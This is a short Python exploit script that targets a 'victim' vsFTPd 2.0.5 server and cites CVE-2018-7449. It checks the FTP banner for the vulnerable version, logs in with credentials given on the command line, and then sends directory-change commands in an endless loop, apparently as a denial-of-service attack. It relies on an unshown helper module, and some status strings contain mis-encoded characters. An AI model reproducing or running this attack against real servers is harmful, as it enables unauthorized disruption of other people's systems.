#!coding=utf-8
import argparse
from time import sleep
from exploitModuleFTP import *

def main(victim, port, username, passwd):
	emf = exploitModuleFTP(victim, port)
	print("[*] Starting Exploit... ðŸš€")
	print(f"[*] Connect ftp in ({victim}, {port})")

	resp = emf.connectServer()
	if resp != False:
		print("[*] Execute Exploit...")
		exec_exploit(emf, username, passwd, resp)
	else:
		emf.close_connection()
		print("[âœ˜] failed to connect !!")

def exec_exploit(emf, u, p, r):
	bannerServer = str(r)
	if "(vsFTPd 2.0.5)" in bannerServer:
		print("[*] Server response:")
		print(bannerServer)
		print(f"\n[*] Login {emf.ip} server...")
		print(f" ... USER {u}")
		sleep(1)
		print(f" ... PASS {p}")
		sleep(1)
		
		r = emf.login(u, p)
        
		if r == False:
			print("\n[âœ˜] username or password incorrect !!")
		else:
			print("\n[*] Server response:")
			print(r)
			sleep(1)
			__exploit(emf,"./")

def __exploit(emf, directory):
	try:
		while True:
			print(emf.changeDir(str(directory)))
	except KeyboardInterrupt:
		print("\nBye Bye...")
		emf.ftp.quit()

if __name__ == '__main__':
	parser = argparse.ArgumentParser(description="simple python exploit using CVE-2018-7449")
	parser.add_argument("victim", help="Victim server vsftpd 2.0.5")
	parser.add_argument("port", type=int, help="Port server vsftpd 2.0.5")
	parser.add_argument("username", help="username login")
	parser.add_argument("passwd", help="password login")
	args = parser.parse_args()
	main(args.victim, args.port, args.username, args.passwd)


